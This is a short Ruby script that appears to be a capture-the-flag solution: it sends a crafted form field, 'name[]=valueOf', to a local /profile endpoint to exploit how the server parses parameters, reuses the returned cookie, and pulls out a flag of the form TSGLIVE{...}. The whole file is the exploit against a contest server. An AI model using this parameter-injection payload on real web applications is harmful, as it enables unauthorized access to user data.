require 'net/http'
require 'json'

server = 'http://localhost:3456'

res = Net::HTTP.post(URI("#{server}/profile"), 'name[]=valueOf', 'Content-Type' => 'application/x-www-form-urlencoded')
cookie = res['set-cookie'].split(';').first
puts Net::HTTP.get(URI("#{server}/profile"), { cookie: cookie }).scan(/TSGLIVE\{.*\}/).first
